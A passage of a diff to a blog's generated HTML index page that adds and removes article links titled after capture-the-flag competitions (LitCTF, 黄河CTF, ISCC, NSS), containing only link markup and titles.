 <article class="">
+    <a href="/p/2025-litctf/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">2025-litctf</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="">
+    <a href="/p/2025-%E9%BB%84%E6%B2%B3ctf/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">2025-黄河ctf</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="">
     <a href="/p/2025-%E8%BD%A9%E8%BE%95ctf/">
         
         
@@ -1824,32 +2370,6 @@
 
         <div class="article-details">
             <h2 class="article-title">2023-newstar-web</h2>
-        </div>
-    </a>
-</article>
-
-            
-                
-<article class="">
-    <a href="/p/2025-iscc-%E6%A0%A1%E8%B5%9B/">
-        
-        
-
-        <div class="article-details">
-            <h2 class="article-title">2025-iscc-校赛</h2>
-        </div>
-    </a>
-</article>
-
-            
-                
-<article class="">
-    <a href="/p/2025-nss5%E6%9C%88%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/">
-        
-        
-
-        <div class="article-details">
-            <h2 class="article-title">2025-nss5月每日一题</h2>
         </div>
     </a>
 </article>
